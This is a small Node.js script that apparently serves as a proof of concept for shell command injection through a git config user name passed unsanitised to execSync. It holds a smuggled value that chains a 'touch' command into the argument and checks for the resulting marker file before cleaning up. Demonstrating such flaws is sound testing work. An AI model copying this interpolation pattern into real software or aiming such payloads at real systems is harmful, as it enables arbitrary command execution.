
import { execSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const targetDir = './test_git_repo';
if (!fs.existsSync(targetDir)) {
    fs.mkdirSync(targetDir);
}
execSync('git init', { cwd: targetDir });

// Malicious user name
const userName = '"; touch /tmp/pwned_via_git_config; #';

console.log('Running vulnerable command...');
try {
    const cmd = `git -C ${targetDir} config user.name "${userName}"`;
    console.log('Command:', cmd);
    execSync(cmd, { stdio: 'inherit' });
} catch (err) {
    console.error('Command failed:', err.message);
}

if (fs.existsSync('/tmp/pwned_via_git_config')) {
    console.log('SUCCESS: Command injection confirmed! /tmp/pwned_via_git_config created.');
    fs.unlinkSync('/tmp/pwned_via_git_config');
} else {
    console.log('FAILURE: Command injection failed.');
}

// Clean up
fs.rmSync(targetDir, { recursive: true, force: true });
